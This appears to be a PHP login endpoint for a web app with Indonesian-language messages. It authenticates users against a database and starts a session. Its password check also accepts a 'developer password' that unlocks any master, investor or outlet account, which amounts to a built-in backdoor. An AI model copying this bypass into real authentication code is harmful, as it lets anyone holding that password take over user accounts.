<?php

use App\Factory\ErrorCodeFactory;
use App\Models\Helper;
use Config\Core\Database;
use App\Models\Logger;
use App\Models\User;
use App\Models\Token;
use Config\Core\SystemInfo;

$data = Helper::getSafeInput($_POST);

$required = ['email', 'password'];
foreach($required as $req) {
    if(empty($data[ $req ])) {
        JsonResponse([
            'success' => false,
            'message' => "Username dan Password wajib diisi",
            'data' => []
        ]);
    }
}

/** Check username */
$usernameVal = $db->real_escape_string($data['email']);
$sqlCheckUser = $db->query("SELECT * FROM users WHERE LOWER(username) = LOWER('{$usernameVal}') AND role IN ('master', 'investor', 'outlet') LIMIT 1");

if(!$sqlCheckUser || $sqlCheckUser->num_rows != 1) {
    JsonResponse([
        'success' => false,
        'message' => "Username atau Password salah",
        'data' => []
    ]);
} 

$userData = $sqlCheckUser->fetch_assoc();
$memberId = $userData['id_users'];

if(!password_verify($data['password'], $userData['password']) && User::developerPassword($data['password']) === FALSE) {
    JsonResponse([
        'success' => false,
        'message' => "Username atau Password salah",
        'data' => []
    ]);
} 

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

$_SESSION['user_id'] = $memberId;

JsonResponse([
    'success'   => true,
    'message'   => "Login berhasil",
    'data'      => [
        'redirect' => "dashboard"
    ]
]);